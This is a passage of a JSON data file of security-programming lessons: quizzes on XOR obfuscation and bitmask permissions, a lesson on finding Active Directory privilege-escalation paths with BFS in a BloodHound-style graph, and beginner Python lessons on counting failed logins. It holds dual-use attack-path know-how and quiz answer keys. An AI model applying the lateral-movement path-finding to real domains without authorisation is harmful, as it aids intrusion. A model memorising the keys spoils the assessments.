2.</p>\n</div>\n","checkpoints":[{"question":"Why is the XOR ($oplus$) bitwise operation ubiquitous in malware obfuscation and shellcode encoders?","options":["XOR encryption exceeds the cryptographic strength of RSA 4096-bit keys","XOR is an involutory operation ($A \\oplus B \\oplus B = A$), meaning decryption shares the identical logic with encryption, runs in a single CPU cycle, and disrupts static signatures","XOR automatically attaches valid Microsoft digital certificates to binaries","XOR operates exclusively within assembly languages"],"answer":1,"explanation":"XOR's self-inverse property enables symmetrical encoding and decoding with a single minimal stub. It executes in one CPU cycle, alters byte distributions, and bypasses static AV string checks."},{"question":"In bitmask authorization systems, given `mask = 0b0011`, which bitwise expression revokes the write privilege bit `PERM_WRITE = 0b0010`?","options":["mask = mask | PERM_WRITE","mask = mask & (~PERM_WRITE)","mask = mask ^ (~PERM_WRITE)","mask = mask << PERM_WRITE"],"answer":1,"explanation":"Inverting the target bit via `~PERM_WRITE` yields a mask where all bits are 1 except the target bit (0). Performing bitwise AND resets that specific bit while preserving all other flags."}]},
  "prog-07-02": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Graph Theory & AD</div>\n  <h1>Graph Traversal in Active Directory Attack Paths (BloodHound)</h1>\n  <p class=\"lead\">Across enterprise Active Directory (AD) domains containing thousands of workstations, users, groups, and GPOs, adversaries rarely require 0-day exploits to seize control. Lateral movement leverages misconfigured permissions and session tokens to pivot step-by-step from a compromised receptionist workstation directly to Domain Controllers. This operational attack chain is fundamentally a <strong>Directed Graph Shortest Path Problem</strong>. This section deconstructs graph modeling and Breadth-First Search (BFS) in security graphs.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li>Model enterprise identity graphs using <strong>Vertices (Nodes)</strong> and <strong>Edges (Relationships)</strong>.</li>\n    <li>Understand the graph analytics underpinning <strong>BloodHound</strong> and Neo4j.</li>\n    <li>Implement <strong>Breadth-First Search (BFS)</strong> to compute the absolute shortest lateral movement killchain.</li>\n    <li>Apply graph centrality to identify choke points for defensive enterprise hardening.</li>\n  </ul>\n</div>\n\n<h2>1. Active Directory Identity Graph Topology</h2>\n<p>Modern access control networks operate as directed multi-relational graphs:</p>\n<ul>\n  <li><strong>Nodes (Vertices)</strong>: Entities including <code>User</code>, <code>Computer</code>, <code>Group</code>, and <code>OU</code>.</li>\n  <li><strong>Edges (Relationships)</strong>: Permissions including <code>MemberOf</code>, <code>AdminTo</code>, <code>HasSession</code>, and <code>GenericAll</code>.</li>\n</ul>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Active Directory Attack Graph Representation</div>\n  <pre><code class=\"language-python\">AD_ATTACK_GRAPH = {\n    \"User_Reception\": [\"Workstation_01\"],\n    \"Workstation_01\": [\"User_Helpdesk\"],\n    \"User_Helpdesk\":  [\"IT_Support_Group\"],\n    \"IT_Support_Group\": [\"Server_FileShare\"],\n    \"Server_FileShare\": [\"User_DomainAdmin_Session\"],\n    \"User_DomainAdmin_Session\": [\"Domain_Controller\"],\n    \"Guest_Account\": [\"Public_Share\"]\n}</code></pre>\n</div>\n\n<h2>2. Breadth-First Search (BFS) for Shortest Killchain Discovery</h2>\n<p>Defenders must evaluate: \"How many hops separate an unprivileged foothold from complete domain compromise?\". A <strong>Breadth-First Search (BFS)</strong> using a First-In-First-Out (FIFO) queue guarantees discovering the shortest path:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">BFS Shortest Attack Path Discovery Engine</div>\n  <pre><code class=\"language-python\">from collections import deque\n\ndef find_shortest_attack_path(graph: dict, start_node: str, target_node: str) -> list:\n    \"\"\"Computes shortest traversal path between foothold and domain controller\"\"\"\n    if start_node not in graph or target_node not in graph:\n        return []\n\n    queue = deque([[start_node]])\n    visited = {start_node}\n\n    while queue:\n        current_path = queue.popleft()\n        current_endpoint = current_path[-1]\n\n        if current_endpoint == target_node:\n            return current_path\n\n        for neighbor in graph.get(current_endpoint, []):\n            if neighbor not in visited:\n                visited.add(neighbor)\n                new_path = list(current_path)\n                new_path.append(neighbor)\n                queue.append(new_path)\n\n    return []\n\nstart = \"User_Reception\"\ntarget = \"Domain_Controller\"\nshortest_path = find_shortest_attack_path(AD_ATTACK_GRAPH, start, target)\n\nprint(\"=== Shortest Lateral Escalation Path ===\")\nif shortest_path:\n    print(f\"[!] Path found! Only {len(shortest_path) - 1} hops to Domain Admin:\")\n    print(\" -> \".join(shortest_path))</code></pre>\n</div>\n\n<h2>3. Industrial Defense: Choke Point Hardening</h2>\n<p>BloodHound analyzes graph paths to reveal attack vectors:</p>\n<ul>\n  <li>Adversaries leverage path queries to unearth hidden delegations through complex permission webs.</li>\n  <li>Defenders apply <strong>Betweenness Centrality</strong> algorithms to identify critical choke point assets (such as <code>Server_FileShare</code> above), severing unnecessary privileges and invalidating multi-hop killchains.</li>\n</ul>\n\n<div class=\"summary-box\">\n  <div class=\"summary-title\">🎯 Chapter Summary & Key Takeaways</div>\n  <ul>\n    <li><strong>Graph Perspective</strong>: Identity and credential pivots operate as relational graphs rather than isolated vulnerabilities.</li>\n    <li><strong>BFS Guarantees</strong>: Breadth-First Search mathematically guarantees discovering the minimal hop escalation path.</li>\n    <li><strong>Choke Point Disruption</strong>: Hardening critical high-centrality bridge nodes breaks entire multi-hop attack graphs.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Graph Traversal</div>\n  <p><strong>Exercise 1:</strong> Why is the <code>visited</code> set critical in graph traversal? If host A is admin on host B, and host B maintains an active session on host A, what occurs if the visited guard is omitted?</p>\n  <p><strong>Exercise 2:</strong> In the BFS function, if <code>queue.popleft()</code> is replaced with <code>queue.pop()</code>, into which traversal algorithm does it convert? Does it still guarantee shortest path discovery?</p>\n</div>\n","checkpoints":[{"question":"In Active Directory attack graph tools (e.g. BloodHound), why is Breadth-First Search (BFS) preferred over Depth-First Search (DFS) when discovering privilege escalation paths?","options":["BFS source code is shorter than DFS","BFS traverses level-by-level using a FIFO queue, mathematically guaranteeing discovery of the shortest attack path with the fewest hops to Domain Admin","DFS cannot evaluate alphanumeric node names","BFS applies exclusively to undirected graphs"],"answer":1,"explanation":"BFS expands outward uniformly from the starting node. The first time the target node is reached, the path taken is mathematically guaranteed to have the minimal number of edges (hops)."},{"question":"When traversing Active Directory permission graphs, why must the search algorithm maintain a `visited = set()`?","options":["Without tracking visited nodes, cyclic trust relationships (e.g. Host A has rights on Host B, and Host B maintains a session on Host A) cause infinite loops and stack exhaustion","visited is a reserved internal keyword in Neo4j databases","It counts the total number of computers in the domain","The visited set reports progress to endpoint antivirus software"],"answer":0,"explanation":"Identity networks contain dense cyclic relationships. Without a visited set, graph traversal algorithms would loop endlessly across cyclical edges until memory exhaustion crashes the script."}]},
  "prog-01-04": {"html":"<h1>Text and dictionaries: count logs by source</h1><p>What You Will Learn: split text into fields and use a dictionary to count events per source. The format is fixed: STATUS, a space, then an IP. For now all input follows that contract; the next lesson handles malformed records.</p><h2>Walk through the example</h2><p>line.split() separates whitespace-delimited fields and assigns them to status and ip. counts maps each source to its failure count. counts.get(ip, 0) supplies zero for a source not previously seen; adding one and assigning it back updates the total.</p><div class=\"code-block\"><pre><code class=\"language-python\" data-expected=\"2\">lines = [&quot;FAILED 192.0.2.10&quot;, &quot;SUCCESS 192.0.2.20&quot;, &quot;FAILED 192.0.2.10&quot;]\ncounts = {}\nfor line in lines:\n    status, ip = line.split()\n    if status == &quot;FAILED&quot;:\n        counts[ip] = counts.get(ip, 0) + 1\nprint(counts[&quot;192.0.2.10&quot;])</code></pre></div><p>Output / 输出</p><pre class=\"expected-output\">2</pre><div class=\"callout info\"><h2>Common pitfalls</h2><p>get is useful because a previously unseen source is expected here. It is not a universal replacement for indexing: when a key is required, indexing and handling KeyError can reveal a broken data contract. These are documentation addresses; do not scan them.</p></div><h2>Chapter Summary</h2><p>Chapter Summary: split extracts fields and a dictionary stores per-source totals. Next, add input validation and exception handling to this tool.</p><aside class=\"lesson-sources\"><p>References and review: 2026-11-06 · Examples use Python 3.10+.</p><a href=\"https://docs.python.org/3/tutorial/datastructures.html#dictionaries\" target=\"_blank\" rel=\"noopener\">Python documentation</a></aside>","checkpoints":[{"question":"For a new source, what does counts.get(ip, 0) return?","options":["None","1","0","The whole dictionary"],"answer":2,"explanation":"The second argument supplies the default when the key is absent: zero here."},{"question":"If one IP fails twice, how many keys represent it?","options":["Two keys storing 1","One key storing 2","No keys","Three keys"],"answer":1,"explanation":"The same source uses the same key; update its value."}],"task":{"prompt":"Exercises: process FAILED 192.0.2.10, FAILED 192.0.2.20, and FAILED 192.0.2.10. Enter the count for each source.","fields":[{"label":"Count for 192.0.2.10","answer":"2"},{"label":"Count for 192.0.2.20","answer":"1"}],"hint":"Each dictionary key has its own counter."}},
  "prog-01-05": {"html":"<h1>Handle errors: finish your log analysis tool</h1><p>What You Will Learn: handle malformed records while preserving valid results. Combine variables, loops, functions and dictionaries to count failed logins and report rejected input. This is a small tool for a fixed format, not a production log parser.</p><h2>Walk through the example</h2><p>The standard-library ipaddress module validates addresses. Keep input parsing inside try. A wrong field count, invalid IP or unknown status raises ValueError and enters except. continue skips that record while allowing later valid records to be processed.</p><div class=\"code-block\"><pre><code class=\"language-python\" data-expected=\"2\n2\">from ipaddress import ip_address\n\ndef summarize(lines):\n    counts = {}\n    rejected = 0\n    for line in lines:\n        try:\n            status, raw_ip = line.split()\n            ip = str(ip_address(raw_ip))\n            if status not in [&quot;FAILED&quot;, &quot;SUCCESS&quot;]:\n                raise ValueError(&quot;unknown status&quot;)\n        except ValueError:\n            rejected += 1\n            continue\n        if status == &quot;FAILED&quot;:\n            counts[ip] = counts.get(ip, 0) + 1\n    return counts, rejected\n\nlines = [&quot;FAILED 192.0.2.10&quot;, &quot;broken&quot;, &quot;SUCCESS 192.0.2.20&quot;,\n         &quot;FAILED not-an-ip&quot;, &quot;FAILED 192.0.2.10&quot;]\ncounts, rejected = summarize(lines)\nprint(counts[&quot;192.0.2.10&quot;])\nprint(rejected)</code></pre></div><p>Output / 输出</p><pre class=\"expected-output\">2\n2</pre><div class=\"callout info\"><h2>Common pitfalls</h2><p>Catch the expected ValueError instead of suppressing every exception. Reporting rejected records makes data loss visible. Failed-login counts are an investigative lead, not proof of an attack. A real deployment needs an explicit contract for timestamps, fields, encoding and privacy.</p></div><h2>Chapter Summary</h2><p>Chapter Summary: you have built a parse → validate → count → report workflow. Download the sample below, read it with Path(\"login-sample.log\").read_text(encoding=\"utf-8\").splitlines(), and pass that list to summarize. Import Path from pathlib and keep the script and sample in the same directory.</p><p><a class=\"artifact-download\" href=\"training/login-sample.log\" download>login-sample.log</a></p><p>The sample uses the same fixed format as the example.</p><aside class=\"lesson-sources\"><p>References and review: 2026-11-06 · Examples use Python 3.10+.</p><a href=\"https://docs.python.org/3/tutorial/errors.html#handling-exceptions\" target=\"_blank\" rel=\"noopener\">Python documentation</a></aside>","checkpoints":[{"question":"Why report rejected?","options":["To prove all input is safe","To make skipped data visible and investigate format problems","To hide exceptions","To replace the failed-login count"],"answer":1,"explanation":"Report skipped input so incomplete results are not mistaken for complete statistics."},{"question":"Do three failed logins prove an IP belongs to an attacker?","options":["Yes, block it immediately","No; investigate timing, accounts and other events","Only for public IPs","A dictionary can decide automatically"],"answer":1,"explanation":"A count is a lead; input quality and context affect the conclusion."}],"task":{"prompt":"Exercises: run summarize on the downloaded login-sample.log. Enter the failure count for 192.0.2.10 and the rejected-record count. Rejected records are not failed logins.","fields":[{"label":"Failures from 192.0.2.10","answer":"3"},{"label":"Rejected records","answer":"2"}],"hint":"One record has too few fields and one has an invalid IP. Successes do not increment failures."}}
});
